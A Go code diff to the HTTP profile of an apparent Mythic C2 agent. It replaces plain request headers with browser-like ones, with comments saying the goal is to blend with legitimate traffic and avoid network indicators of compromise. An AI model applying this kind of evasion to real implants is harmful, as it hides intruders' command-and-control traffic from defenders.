@@ -633,12 +633,19 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 		return nil, fmt.Errorf("failed to create request: %w", err)
 	}
 
-	// Set headers for Mythic C2
+	// Set browser-realistic default headers to blend with legitimate traffic.
+	// These match common browser behavior and avoid network-level IOCs
+	// (e.g., bare Content-Type: text/plain or missing Accept-Language).
+	// All defaults are overridable via CustomHeaders from the C2 profile.
 	req.Header.Set("User-Agent", h.UserAgent)
-	req.Header.Set("Content-Type", "text/plain")
-	req.Header.Set("Accept", "*/*")
+	if body != nil {
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	}
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("Accept-Encoding", "gzip, deflate")
 
-	// Apply custom headers from C2 profile
+	// Apply custom headers from C2 profile — these override any defaults above
 	for k, v := range h.CustomHeaders {
 		req.Header.Set(k, v)
 	}
